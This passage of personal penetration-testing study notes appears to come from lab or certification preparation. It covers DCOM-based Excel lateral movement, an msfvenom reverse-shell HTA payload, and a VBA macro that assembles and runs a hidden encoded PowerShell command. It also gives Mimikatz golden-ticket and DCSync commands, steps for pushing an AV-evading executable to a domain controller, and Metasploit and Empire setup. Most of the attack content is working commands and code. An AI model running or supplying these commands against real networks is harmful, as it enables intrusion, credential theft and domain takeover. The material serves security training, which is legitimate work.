$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls" // Create the file and put the path here

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```
Instead of just running notepad, we can launch a reverse shell instead. Generate the `hta` payload (IP is of the compromised client's second interface):
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
```
Python script to split the payload into smaller chunks:
```
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```
Update the macro:
```
Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    ...
    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
    Shell (Str)
End Sub
```
### AD Persistence
#### Golden Tickets
Before generating the golden ticket, we'll delete any existing Kerberos tickets with kerberos::purge.

We'll supply the domain SID (which we can gather with `whoami /user`) to the Mimikatz `kerberos::golden` command to create the golden ticket. This time we'll use the `/krbtgt` option instead of `/rc4` to indicate we are supplying the password hash. We will set the golden ticket's username to `fakeuser`. This is allowed because the domain controller trusts anything correctly encrypted by the krbtgt password hash
```
mimikatz #

kerberos::purge

kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt

misc::cmd
```
#### Domain Controller Synchronization
```
mimikatz #

lsadump::dcsync /user:Administrator
```
#### Domain Controller Misc
Once we determined the hostname of the domain controller, we can attempt to connect to it in PowerShell (via a compromised workstation with domain administrator rights).
```
$dcsesh = New-PSSession -Computer <DC hostname>

Invoke-Command -Session $dcsesh -ScriptBlock {<command, e.g. ipconfig, to test it out>}
```
If successfully able to connect, we can transfer the malicious `exe` file (bypassing AV) to obtain a shell:
```
Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
```
Execute the PowerShell command to run the malicious `exe`:
```
Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\whoami.exe}
```
## Metasploit Framework
```
sudo systemctl start postgresql

sudo systemctl enable postgresql

sudo msfdb init

sudo apt update; sudo apt install metasploit-framework
```
Refer to PDF for best info.

## PowerShell Empire
```
cd /opt

sudo git clone https://github.com/PowerShellEmpire/Empire.git

cd Empire/

sudo ./setup/install.sh
```
If you are struggling to get PowerShell-Empire working or it doesn't look like the training material this is what worked for me

1. Ignore any reference to cloning via git. Just install or upgrade the version that comes with Kali

```
sudo apt install powershell-empire
```

2. To get the client working.

You may get an error about attributes not being present in some ssl library:

```
sudo pip uninstall pyopenssl

[Close Terminal]

pip install pyopenssl
```
3. To get the server working

If you get:
`ImportError: cannot import name 'Mapping' from 'collections'`

This post from OS-554664 offers a fix (thanks to that dude):
https://forums.offensive-security.com/showthread.php?46735-Installation-of-Empire-(23-1-Installation-Setup-and-Usage)

Modify `/usr/local/lib/python3.10/dist-packages/urllib3/util/selectors.py`
```
#from collections import namedtuple, Mapping
from collections import namedtuple
from collections.abc import Mapping
```

Modify `/usr/local/lib/python3.10/dist-packages/urllib3/_collections.py`

```
#from collections import Mapping, MutableMapping
from collections.abc import Mapping, MutableMapping
```

At this point things should be working. Its important to realise that you need to start the server before the client will work

In Terminal 1: `sudo powershell-empire server`.

In Terminal 2: `sudo powershell-empire client`.

## Misc

Making a hexdump of certain files so that it can be used:
```
xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
```
The `xxd` command is used to make the hexdump and the `-p` flag outputs a plain hexdump, which makes it easier for further manipulation. We use `tr` to delete the new line character and then dump the contents of the output to a file named `lib_mysqludf_sys.so.hex`.

----
Using RDP with `proxychains`:
```
proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
```
`+clipboard` is used to allow us to copy and paste to the remote desktop.

----
Escaping restricted bash `rbash`:
https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/

----
TFTP has no encryption and authentication, can scan TFTP port 69 for access:
`nmap -v -sU --top-ports=20 <IP>`
Do TFTP traversal to access files.

----
Powershell on Linux:
https://www.linuxfordevices.com/tutorials/linux/install-run-powershell-on-linux

----
SSH `authorized_keys`
If you have obtained `authorized_keys`, you may use the following to obtain the public key associated to it:
https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process
Caveat: Only affects SSH keys generated on Debian-based systems between September 2006 and May 2008 (https://github.com/g0tmi1k/debian-ssh)
Login with `ssh -i <public key (without .pub extension)> -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss bob@10.11.1.136`

`authorized_keys` resides on the server, and authenticates with the user's public key to authenticate the user
`known_hosts` resides on the client, and authenticates with the server's private key to authenticate the server
https://security.stackexchange.com/questions/20706/what-is-the-difference-between-authorized-keys-and-known-hosts-file-for-ssh	

### Scripts
Shellshock
https://raw.githubusercontent.com/Blevene/Random-Python-Scripts/master/shellshock.py

Potatoes:
See Privilege Escalation
	
JS Deobfuscator
https://lelinhtinh.github.io/de4js/
https://deobfuscate.io/

### Additional References
Web Application Attack on ALPHA https://usermanual.wiki/Document/Offensive20Securitys20Complete20Guide20to20Alpha.546296816/view
(Privilege Escalation via OSSEC, MySQL)

Other people's notes https://cheatsheet.haax.fr/network/services-enumeration/
Port 4555 / James Remote Administration Tool / POP3 / IMAP https://dominicbreuker.com/post/htb_solidstate/

Anonymous FTP Login / Priv Esc
https://infinitelogins.com/tag/anonymous-ftp/

General
https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets
